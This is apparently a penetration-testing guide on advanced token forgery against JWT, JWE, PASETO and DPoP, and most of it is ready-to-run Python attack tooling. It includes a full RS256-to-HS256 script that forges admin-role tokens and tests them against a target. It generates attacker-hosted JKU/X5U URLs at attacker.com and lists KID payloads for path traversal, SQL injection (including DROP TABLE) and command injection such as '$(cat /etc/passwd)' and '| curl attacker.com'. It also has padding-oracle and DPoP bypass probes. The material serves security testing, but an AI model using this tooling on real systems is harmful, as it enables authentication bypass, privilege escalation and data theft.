# Advanced Token Forgery Attacks

## Overview

This document covers advanced token attack techniques beyond the basics in `06-jwt-attacks.md`, including deep dives into JWT algorithm confusion mechanics, JWK/JKU/X5U header injection with bypass techniques, JWE (encrypted JWT) attacks, PASETO vs JWT comparison, token binding bypass, and DPoP (Demonstrating Proof-of-Possession) token attacks. Includes 2024-2025 CVEs and tooling.

**Key Sources**:
- https://portswigger.net/web-security/jwt/algorithm-confusion
- https://pentesterlab.com/blog/another-jwt-algorithm-confusion-cve-2024-54150
- https://datatracker.ietf.org/doc/html/rfc9449
- https://permify.co/post/jwt-paseto/

---

## 1. JWT Algorithm Confusion Deep Dive

### 1.1 RS256 to HS256 Attack Mechanics

**Vulnerability**: When a server is configured to use RS256 (asymmetric) but the JWT library accepts the algorithm specified in the token header, an attacker can change it to HS256 (symmetric) and sign using the public key.

**Source**: https://portswigger.net/web-security/jwt/algorithm-confusion

**Why It Works**:
```
RS256 Flow:
  Server signs with PRIVATE key
  Server verifies with PUBLIC key

HS256 Flow:
  Server signs with SECRET key
  Server verifies with SAME SECRET key

Attack:
  1. Get server's PUBLIC key (usually available at /.well-known/jwks.json)
  2. Change token header alg from RS256 to HS256
  3. Sign token using PUBLIC key as the HMAC secret
  4. Server sees HS256, uses its "verification key" (the public key)
  5. HMAC(payload, public_key) == signature (matches!)
  6. Authentication bypassed
```

**Complete Exploitation Script**:
```python
#!/usr/bin/env python3
"""JWT Algorithm Confusion Attack - RS256 to HS256"""

import jwt
import json
import base64
import requests
from cryptography.hazmat.primitives import serialization

class AlgorithmConfusionAttacker:
    """Comprehensive JWT algorithm confusion attack tool."""

    def __init__(self, target_url):
        self.target_url = target_url

    def obtain_public_key(self):
        """Retrieve the server's public key from common endpoints."""
        key_endpoints = [
            '/.well-known/jwks.json',
            '/jwks.json',
            '/oauth/jwks',
            '/auth/jwks',
            '/.well-known/openid-configuration',  # Contains jwks_uri
            '/api/.well-known/jwks.json',
            '/realms/master/protocol/openid-connect/certs',  # Keycloak
        ]

        for endpoint in key_endpoints:
            try:
                resp = requests.get(f"{self.target_url}{endpoint}")
                if resp.status_code == 200:
                    data = resp.json()

                    # Handle OIDC discovery document
                    if 'jwks_uri' in data:
                        resp = requests.get(data['jwks_uri'])
                        data = resp.json()

                    if 'keys' in data:
                        return data['keys']
            except:
                pass

        return None

    def jwk_to_pem(self, jwk_key):
        """Convert JWK to PEM format for use as HMAC secret."""
        from jwt.algorithms import RSAAlgorithm
        public_key = RSAAlgorithm.from_jwk(json.dumps(jwk_key))
        pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        return pem

    def forge_token(self, original_token, public_key_pem, claims_to_modify=None):
        """
        Forge a token using algorithm confusion.
        Changes RS256 to HS256 and signs with the public key.
        """
        # Decode without verification
        payload = jwt.decode(original_token, options={"verify_signature": False})
        header = jwt.get_unverified_header(original_token)

        # Modify claims
        if claims_to_modify:
            payload.update(claims_to_modify)

        # Sign with HS256 using public key as HMAC secret
        forged = jwt.encode(
            payload,
            public_key_pem,
            algorithm='HS256',
            headers={'kid': header.get('kid')}  # Preserve kid if present
        )

        return forged

    def exploit(self, original_token, target_claims=None):
        """Full exploitation chain."""
        # Step 1: Get public key
        jwk_keys = self.obtain_public_key()
        if not jwk_keys:
            return {'error': 'Could not obtain public key'}

        results = []
        for key in jwk_keys:
            try:
                pem = self.jwk_to_pem(key)

                # Step 2: Forge token
                default_claims = {'role': 'admin', 'is_admin': True}
                claims = target_claims or default_claims

                forged = self.forge_token(original_token, pem, claims)

                # Step 3: Test forged token
                resp = requests.get(
                    f"{self.target_url}/api/me",
                    headers={'Authorization': f'Bearer {forged}'}
                )

                results.append({
                    'kid': key.get('kid'),
                    'forged_token': forged,
                    'accepted': resp.status_code == 200,
                    'response': resp.text[:200]
                })
            except Exception as e:
                results.append({'kid': key.get('kid'), 'error': str(e)})

        return results
```

### 1.2 CVE-2024-54150 and Similar Library Bugs

**CVE-2024-54150**: JWT library algorithm confusion vulnerability allowing token forgery.

**Source**: https://pentesterlab.com/blog/another-jwt-algorithm-confusion-cve-2024-54150

```python
"""
Test for algorithm confusion across different JWT libraries.
Each library has its own quirks in how it handles algorithm validation.
"""

LIBRARY_SPECIFIC_BYPASSES = {
    'pyjwt': {
        'versions': '< 2.4.0',
        'bypass': 'algorithms parameter not enforced when key is string',
        'test': lambda token, key: jwt.decode(token, key, algorithms=['HS256'])
    },
    'jsonwebtoken_node': {
        'versions': '< 9.0.0',
        'bypass': 'Secret as string allows algorithm switch',
        'note': 'Use options.algorithms to restrict'
    },
    'jose4j': {
        'versions': 'All if misconfigured',
        'bypass': 'setVerificationKey without algorithm restriction',
    },
    'authlib': {
        'versions': '< 1.3.1 (CVE-2024-37568)',
        'bypass': 'Algorithm confusion in decode method',
    },
    'ruby_jwt': {
        'versions': '< 2.5.0',
        'bypass': 'Algorithm not verified against key type',
    },
    'nimbus_jose': {
        'versions': 'Misconfigured instances',
        'bypass': 'JWSVerifier accepts any algorithm if not restricted',
    },
}
```

---

## 2. JWK Injection Attacks

### 2.1 Embedded JWK Attack

**Vulnerability**: Some servers trust the JWK embedded in the token header for signature verification, allowing attackers to self-sign tokens.

```python
#!/usr/bin/env python3
"""JWK Injection Attack Tool"""

from jwcrypto import jwk, jwt as jose_jwt
import json

class JWKInjectionAttacker:
    """Self-sign JWT by embedding attacker's public key in the header."""

    def __init__(self):
        # Generate attacker's key pair
        self.key = jwk.JWK.generate(kty='RSA', size=2048, kid='attacker-key-1')

    def create_self_signed_token(self, claims):
        """Create a JWT with the attacker's public key embedded in the header."""
        # Get public key for embedding
        pub_key = json.loads(self.key.export_public())

        # Create token with embedded JWK
        header = {
            "alg": "RS256",
            "typ": "JWT",
            "jwk": pub_key  # Embedded public key
        }

        token = jose_jwt.JWT(header=header, claims=claims)
        token.make_signed_token(self.key)
        return token.serialize()

    def create_with_jku(self, claims, jku_url):
        """Create JWT pointing to attacker-controlled JWK Set URL."""
        header = {
            "alg": "RS256",
            "typ": "JWT",
            "jku": jku_url,
            "kid": self.key.key_id,
        }

        token = jose_jwt.JWT(header=header, claims=claims)
        token.make_signed_token(self.key)
        return token.serialize()

    def create_with_x5u(self, claims, x5u_url):
        """Create JWT pointing to attacker-controlled X.509 certificate URL."""
        header = {
            "alg": "RS256",
            "typ": "JWT",
            "x5u": x5u_url,
        }

        token = jose_jwt.JWT(header=header, claims=claims)
        token.make_signed_token(self.key)
        return token.serialize()

    def get_jwks_for_hosting(self):
        """Get JWKS document to host on attacker's server."""
        return json.dumps({"keys": [json.loads(self.key.export_public())]}, indent=2)

    def generate_jku_bypass_urls(self, trusted_domain):
        """Generate JKU URLs that might bypass validation."""
        attacker_url = "https://attacker.com/jwks.json"
        return [
            attacker_url,
            f"https://{trusted_domain}@attacker.com/jwks.json",
            f"https://attacker.com#{trusted_domain}/jwks.json",
            f"https://attacker.com?{trusted_domain}/jwks.json",
            f"https://{trusted_domain}.attacker.com/jwks.json",
            f"https://attacker.com/{trusted_domain}/jwks.json",
            f"https://{trusted_domain}%00.attacker.com/jwks.json",
            # Open redirect on trusted domain
            f"https://{trusted_domain}/redirect?url=https://attacker.com/jwks.json",
            f"https://{trusted_domain}/out?to=https://attacker.com/jwks.json",
            # DNS rebinding
            f"https://jwks.{trusted_domain[:-4]}.attacker.com/jwks.json",
        ]
```

### 2.2 KID (Key ID) Advanced Injection

```python
class KIDInjectionAttacker:
    """Advanced KID parameter injection techniques."""

    def generate_kid_payloads(self):
        """Generate KID injection payloads for various backends."""
        return {
            # Path traversal (file-based key storage)
            'path_traversal': [
                '../../../../../../dev/null',
                '../../../../../../proc/self/environ',
                '../../../../../../etc/hostname',
                '/dev/null',
                '../../../empty_file',
                '....//....//....//dev/null',
                '..\\..\\..\\..\\..\\..\\dev\\null',  # Windows
            ],

            # SQL injection (database key storage)
            'sql_injection': [
                "' UNION SELECT 'attacker-secret' -- ",
                "' UNION SELECT '' -- ",
                "1 OR 1=1 UNION SELECT 'secret' -- ",
                "'; DROP TABLE keys; --",
                "' UNION ALL SELECT CONCAT(0x,"
            ],

            # Command injection (shell-based key retrieval)
            'command_injection': [
                '| cat /etc/passwd',
                '; cat /etc/passwd',
                '`cat /etc/passwd`',
                '$(cat /etc/passwd)',
                '| curl attacker.com',
            ],

            # LDAP injection
            'ldap_injection': [
                '*',
                '*)(&',
                '*)(uid=*))(|(uid=*',
            ],

            # Template injection
            'template_injection': [
                '{{7*7}}',
                '${7*7}',
                '<%= 7*7 %>',
            ],

            # Special values
            'special_values': [
                '',          # Empty string as key
                'null',
                'undefined',
                'true',
                '0',
                '[]',
                '{}',
            ]
        }

    def test_kid_injection(self, target_url, original_token, payloads=None):
        """Test KID injection against target."""
        if payloads is None:
            all_payloads = self.generate_kid_payloads()
            payloads = []
            for category in all_payloads.values():
                payloads.extend(category)

        results = []
        for kid_payload in payloads:
            try:
                # Create token with injected KID
                header = jwt.get_unverified_header(original_token)
                payload_data = jwt.decode(original_token, options={"verify_signature": False})

                header['kid'] = kid_payload

                # Try signing with empty key (for path traversal to /dev/null)
                forged = jwt.encode(payload_data, '', algorithm='HS256', headers=header)

                resp = requests.get(
                    f"{target_url}/api/me",
                    headers={'Authorization': f'Bearer {forged}'}
                )

                results.append({
                    'kid_payload': kid_payload,
                    'accepted': resp.status_code == 200,
                    'status': resp.status_code,
                })
            except Exception as e:
                results.append({
                    'kid_payload': kid_payload,
                    'error': str(e)
                })

        return results
```

---

## 3. JWE (JSON Web Encryption) Attacks

### 3.1 JWE Structure and Attack Vectors

**Vulnerability**: JWE tokens encrypt their payload but have specific cryptographic weaknesses.

```
JWE Structure: Header.EncryptedKey.IV.Ciphertext.AuthTag
  - Header: {"alg": "RSA-OAEP", "enc": "A256GCM"}
  - EncryptedKey: Encrypted Content Encryption Key (CEK)
  - IV: Initialization Vector
  - Ciphertext: Encrypted payload
  - AuthTag: Authentication tag
```

**JWE Attack Techniques**:
```python
#!/usr/bin/env python3
"""JWE Attack Framework"""

import json
import base64
from jwcrypto import jwk, jwe

class JWEAttacker:
    """Attack JWE (JSON Web Encryption) tokens."""

    def test_algorithm_downgrade(self, target_url, original_jwe):
        """Test if JWE encryption algorithm can be downgraded."""
        parts = original_jwe.split('.')
        header_b64 = parts[0]
        header = json.loads(base64.urlsafe_b64decode(header_b64 + '=='))

        # Weaker algorithms to test
        weak_algorithms = {
            'key_management': [
                'RSA1_5',       # PKCS1 v1.5 (padding oracle attacks)
                'dir',          # Direct symmetric key (no key wrapping)
                'A128KW',       # 128-bit key wrap (weaker)
                'ECDH-ES',      # Direct ECDH (no key wrapping)
            ],
            'content_encryption': [
                'A128CBC-HS256',  # CBC mode (potential padding oracle)
                'A128GCM',        # 128-bit GCM (weaker than 256)
            ]
        }

        results = []
        for alg in weak_algorithms['key_management']:
            modified_header = {**header, 'alg': alg}
            results.append({
                'algorithm': alg,
                'type': 'key_management',
                'test': 'downgrade',
                'note': self._get_algorithm_weakness(alg)
            })

        return results

    def test_rsa_pkcs1_padding_oracle(self, target_url, jwe_token):
        """
        Test for Bleichenbacher padding oracle attack on RSA1_5.
        If the server uses RSA PKCS1 v1.5 and returns different errors
        for padding vs decryption failures, it may be vulnerable.
        """
        parts = jwe_token.split('.')
        encrypted_key = base64.urlsafe_b64decode(parts[1] + '==')

        # Modify encrypted key and observe responses
        test_modifications = [
            encrypted_key[:-1] + bytes([encrypted_key[-1] ^ 0xFF]),  # Flip last byte
            encrypted_key[:2] + bytes([0x00, 0x01]) + encrypted_key[4:],  # Valid padding prefix
            bytes([0xFF]) * len(encrypted_key),  # All 0xFF
            bytes([0x00]) * len(encrypted_key),  # All 0x00
        ]

        results = []
        for mod in test_modifications:
            modified_jwe = '.'.join([
                parts[0],
                base64.urlsafe_b64encode(mod).decode().rstrip('='),
                *parts[2:]
            ])

            resp = requests.post(
                f"{target_url}/api/decrypt",
                headers={'Authorization': f'Bearer {modified_jwe}'}
            )

            results.append({
                'status': resp.status_code,
                'error_message': resp.text[:200],
                'response_time': resp.elapsed.total_seconds()
            })

        # Check for oracle
        statuses = set(r['status'] for r in results)
        messages = set(r['error_message'] for r in results)

        return {
            'different_status_codes': len(statuses) > 1,
            'different_error_messages': len(messages) > 1,
            'potential_padding_oracle': len(statuses) > 1 or len(messages) > 1,
            'results': results
        }

    def test_cbc_iv_manipulation(self, jwe_token):
        """
        Test CBC mode IV manipulation for chosen plaintext attacks.
        If JWE uses A*CBC-HS* encryption, IV manipulation can
        modify the first block of decrypted plaintext.
        """
        parts = jwe_token.split('.')
        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))

        if 'CBC' not in header.get('enc', ''):
            return {'applicable': False, 'reason': 'Not using CBC mode'}

        iv = base64.urlsafe_b64decode(parts[2] + '==')

        # XOR IV with desired plaintext change
        # This modifies the first block of the decrypted payload
        return {
            'applicable': True,
            'iv_length': len(iv),
            'attack': 'CBC IV bit-flipping can modify first plaintext block',
            'note': 'Auth tag should prevent this if properly validated'
        }

    def _get_algorithm_weakness(self, alg):
        weaknesses = {
            'RSA1_5': 'Vulnerable to Bleichenbacher padding oracle attack',
            'dir': 'No key wrapping - key compromise = total compromise',
            'A128KW': 'Only 128-bit security - brutable with sufficient resources',
            'ECDH-ES': 'Direct key agreement without key wrapping',
        }
        return weaknesses.get(alg, 'Unknown weakness')
```

---

## 4. PASETO vs JWT Security Comparison

### 4.1 Design Differences

```
JWT (JOSE) Problems:
  - Algorithm specified in token (attacker-controlled)
  - Multiple key types and algorithms create confusion
  - "none" algorithm exists
  - Embedded key headers (jwk, jku, x5u) trust user input
  - Library inconsistencies in validation

PASETO Design:
  - Algorithm determined by version (not in token)
  - No algorithm negotiation
  - No "none" algorithm
  - No embedded key headers
  - Versioned protocol with clear security guarantees

PASETO Versions:
  v1: Symmetric (AES-256-CTR + HMAC-SHA384) / Asymmetric (RSA-PSS)
  v2: Symmetric (XChaCha20-Poly1305) / Asymmetric (Ed25519)
  v3: Symmetric (AES-256-CTR + HMAC-SHA384) / Asymmetric (P-384 ECDSA)
  v4: Symmetric (XChaCha20-Poly1305) / Asymmetric (Ed25519) [Current]
```

**Source**: https://permify.co/post/jwt-paseto/

### 4.2 PASETO Attack Surface (Reduced but Not Zero)

```python
class PASETOAttackSurface:
    """Analyze PASETO implementation for potential weaknesses."""

    @staticmethod
    def known_attack_vectors():
        return {
            'implementation_bugs': {
                'description': 'Library-specific implementation flaws',
                'examples': [
                    'Incorrect nonce handling in v2/v4',
                    'Footer parsing vulnerabilities',
                    'Claims validation bypass',
                ],
                'severity': 'Varies'
            },
            'key_management': {
                'description': 'Weak key management (same as JWT)',
                'examples': [
                    'Hardcoded symmetric keys',
                    'Key leakage in logs/repos',
                    'Insufficient key rotation',
                ],
                'severity': 'HIGH'
            },
            'version_confusion': {
                'description': 'Accepting multiple PASETO versions',
                'examples': [
                    'v1 accepted when v4 is expected (weaker crypto)',
                    'Local tokens accepted when only public should be',
                ],
                'severity': 'MEDIUM'
            },
            'claim_manipulation': {
                'description': 'Claims not properly validated after decryption',
                'examples': [
                    'Expired tokens accepted',
                    'Issuer not validated',
                    'Audience not checked',
                ],
                'severity': 'HIGH'
            },
            'footer_exploitation': {
                'description': 'PASETO footer is unencrypted/unsigned in some modes',
                'examples': [
                    'Key ID in footer manipulated',
                    'Metadata tampering via footer',
                ],
                'severity': 'LOW-MEDIUM'
            }
        }

    @staticmethod
    def test_paseto_version_downgrade(target_url, token):
        """Test if server accepts older/weaker PASETO versions."""
        versions = ['v1', 'v2', 'v3', 'v4']
        results = []

        for version in versions:
            # Modify token version prefix
            modified = version + token[2:]
            resp = requests.get(
                f"{target_url}/api/me",
                headers={'Authorization': f'Bearer {modified}'}
            )
            results.append({
                'version': version,
                'accepted': resp.status_code == 200,
            })

        return results
```

---

## 5. Token Binding and DPoP Attacks

### 5.1 DPoP (Demonstrating Proof-of-Possession)

**DPoP** binds tokens to a specific client using asymmetric cryptography, preventing token theft/replay.

**Source**: https://datatracker.ietf.org/doc/html/rfc9449

```
DPoP Flow:
  1. Client generates ephemeral key pair
  2. Client creates DPoP proof JWT (signed with private key)
  3. Client sends DPoP proof + token request to AS
  4. AS binds access token to client's public key (jkt claim)
  5. Client sends DPoP proof + access token to RS
  6. RS verifies both token and DPoP proof

DPoP Proof JWT:
  Header: {"alg": "ES256", "typ": "dpop+jwt", "jwk": {client_public_key}}
  Payload: {"jti": "unique_id", "htm": "POST", "htu": "https://rs.example.com/api",
            "iat": timestamp, "ath": hash_of_access_token}
```

### 5.2 DPoP Attack Vectors

```python
#!/usr/bin/env python3
"""DPoP Token Attack Framework"""

import jwt
import hashlib
import time
import uuid
from jwcrypto import jwk

class DPoPAttacker:
    """Attack DPoP-protected token flows."""

    def __init__(self):
        self.attacker_key = jwk.JWK.generate(kty='EC', crv='P-256')

    def test_dpop_enforcement(self, target_url, access_token):
        """Test if DPoP is actually enforced by the resource server."""
        # Test without DPoP proof
        resp_no_dpop = requests.get(
            f"{target_url}/api/resource",
            headers={'Authorization': f'DPoP {access_token}'}
        )

        # Test with Bearer instead of DPoP scheme
        resp_bearer = requests.get(
            f"{target_url}/api/resource",
            headers={'Authorization': f'Bearer {access_token}'}
        )

        return {
            'dpop_required': resp_no_dpop.status_code in [401, 403],
            'bearer_accepted': resp_bearer.status_code == 200,
            'vulnerability': 'DPoP not enforced' if resp_bearer.status_code == 200 else None
        }

    def test_dpop_proof_replay(self, target_url, access_token, dpop_proof):
        """Test if DPoP proof can be replayed."""
        results = []
        for i in range(5):
            resp = requests.get(
                f"{target_url}/api/resource",
                headers={
                    'Authorization': f'DPoP {access_token}',
                    'DPoP': dpop_proof  # Same proof reused
                }
            )
            results.append({
                'attempt': i + 1,
                'status': resp.status_code,
                'accepted': resp.status_code == 200
            })
            time.sleep(1)

        replay_count = sum(1 for r in results if r['accepted'])
        return {
            'replay_possible': replay_count > 1,
            'accepted_count': replay_count,
            'results': results
        }

    def test_dpop_key_binding_bypass(self, target_url, access_token):
        """Test if DPoP key binding (jkt claim) is properly validated."""
        # Create DPoP proof with DIFFERENT key than what token is bound to
        attacker_proof = self._create_dpop_proof(
            method='GET',
            url=f"{target_url}/api/resource",
            access_token=access_token
        )

        resp = requests.get(
            f"{target_url}/api/resource",
            headers={
                'Authorization': f'DPoP {access_token}',
                'DPoP': attacker_proof
            }
        )

        return {
            'key_binding_enforced': resp.status_code in [401, 403],
            'bypass_possible': resp.status_code == 200,
            'vulnerability': 'DPoP key binding not validated' if resp.status_code == 200 else None
        }

    def test_dpop_method_url_binding(self, target_url, access_token):
        """Test if HTTP method and URL in DPoP proof are validated."""
        # Create proof for GET but use for POST
        proof_get = self._create_dpop_proof('GET', f"{target_url}/api/resource", access_token)

        resp_method = requests.post(
            f"{target_url}/api/resource",
            headers={
                'Authorization': f'DPoP {access_token}',
                'DPoP': proof_get
            }
        )

        # Create proof for different URL
        proof_other = self._create_dpop_proof('GET', f"{target_url}/api/other", access_token)

        resp_url = requests.get(
            f"{target_url}/api/resource",
            headers={
                'Authorization': f'DPoP {access_token}',
                'DPoP': proof_other
            }
        )

        return {
            'method_validated': resp_method.status_code in [401, 403],
            'url_validated': resp_url.status_code in [401, 403],
            'method_bypass': resp_method.status_code == 200,
            'url_bypass': resp_url.status_code == 200,
        }

    def test_dpop_nonce_handling(self, target_url, access_token):
        """Test DPoP nonce handling (server-provided nonce)."""
        # First request without nonce
        proof = self._create_dpop_proof('GET', f"{target_url}/api/resource", access_token)
        resp = requests.get(
            f"{target_url}/api/resource",
            headers={
                'Authorization': f'DPoP {access_token}',
                'DPoP': proof
            }
        )

        # Check if server requires nonce
        dpop_nonce = resp.headers.get('DPoP-Nonce')
        if dpop_nonce:
            # Test with old/replayed nonce
            old_proof = self._create_dpop_proof(
                'GET', f"{target_url}/api/resource", access_token, nonce=dpop_nonce
            )
            time.sleep(5)
            resp2 = requests.get(
                f"{target_url}/api/resource",
                headers={
                    'Authorization': f'DPoP {access_token}',
                    'DPoP': old_proof
                }
            )
            return {
                'nonce_required': True,
                'old_nonce_accepted': resp2.status_code == 200,
            }

        return {'nonce_required': False}

    def _create_dpop_proof(self, method, url, access_token, nonce=None):
        """Create a DPoP proof JWT."""
        import json as json_module

        pub_key = json_module.loads(self.attacker_key.export_public())

        header = {
            "alg": "ES256",
            "typ": "dpop+jwt",
            "jwk": pub_key
        }

        payload = {
            "jti": str(uuid.uuid4()),
            "htm": method,
            "htu": url,
            "iat": int(time.time()),
            "ath": base64.urlsafe_b64encode(
                hashlib.sha256(access_token.encode()).digest()
            ).decode().rstrip('=')
        }

        if nonce:
            payload["nonce"] = nonce

        # Sign with attacker's private key
        private_pem = self.attacker_key.export_to_pem(private_key=True, password=None)
        return jwt.encode(payload, private_pem, algorithm='ES256', headers=header)
```

---

## 6. Token Binding (RFC 8471) Bypass

### 6.1 Token Binding Attack Vectors

```python
class TokenBindingBypass:
    """Bypass token binding mechanisms."""

    @staticmethod
    def attack_vectors():
        return {
            'tls_termination': {
                'description': 'Token binding relies on TLS channel. If TLS terminates at proxy/CDN, binding is lost.',
                'test': 'Check if target uses TLS-terminating reverse proxy',
                'severity': 'HIGH'
            },
            'browser_downgrade': {
                'description': 'Token binding requires browser support. Downgrade to browser without support.',
                'test': 'Use User-Agent of browser without token binding support',
                'severity': 'MEDIUM'
            },
            'channel_id_confusion': {
                'description': 'Confusion between TLS channel ID and token binding key',
                'test': 'Reuse token binding from different TLS session',
                'severity': 'MEDIUM'
            },
            'missing_enforcement': {
                'description': 'Server does not validate token binding even when present',
                'test': 'Send request without Sec-Token-Binding header',
                'severity': 'HIGH'
            },
        }
```

---

## 7. Testing Checklist

```
# Algorithm Confusion
[ ] Obtain public key from JWKS endpoint
[ ] Test RS256 to HS256 confusion
[ ] Test with multiple keys from JWKS
[ ] Test library-specific bypasses (CVE-2024-54150, CVE-2024-37568)

# JWK/JKU/X5U Injection
[ ] Test embedded JWK in header
[ ] Test JKU with attacker URL
[ ] Test JKU URL bypass techniques (all variants)
[ ] Test X5U with attacker certificate
[ ] Test KID injection (path traversal, SQLi, command injection)

# JWE Attacks
[ ] Test algorithm downgrade (RSA-OAEP to RSA1_5)
[ ] Test padding oracle on RSA1_5
[ ] Test CBC IV manipulation
[ ] Test content encryption downgrade

# PASETO
[ ] Test version downgrade
[ ] Test footer manipulation
[ ] Test claims validation after decryption
[ ] Test key management practices

# DPoP
[ ] Test DPoP enforcement (try without proof)
[ ] Test Bearer scheme acceptance instead of DPoP
[ ] Test proof replay
[ ] Test key binding validation
[ ] Test method/URL binding validation
[ ] Test nonce handling
```

---

## References

- PortSwigger Algorithm Confusion: https://portswigger.net/web-security/jwt/algorithm-confusion
- CVE-2024-54150: https://pentesterlab.com/blog/another-jwt-algorithm-confusion-cve-2024-54150
- CVE-2024-37568 Authlib: https://nvd.nist.gov/vuln/detail/CVE-2024-37568
- JWT Vulnerabilities Guide: https://pentesterlab.com/blog/jwt-vulnerabilities-attacks-guide
- PASETO vs JWT: https://permify.co/post/jwt-paseto/
- DPoP RFC 9449: https://datatracker.ietf.org/doc/html/rfc9449
- Token Binding RFC 8471: https://datatracker.ietf.org/doc/html/rfc8471
- Auth0 DPoP: https://auth0.com/docs/secure/sender-constraining/demonstrating-proof-of-possession-dpop
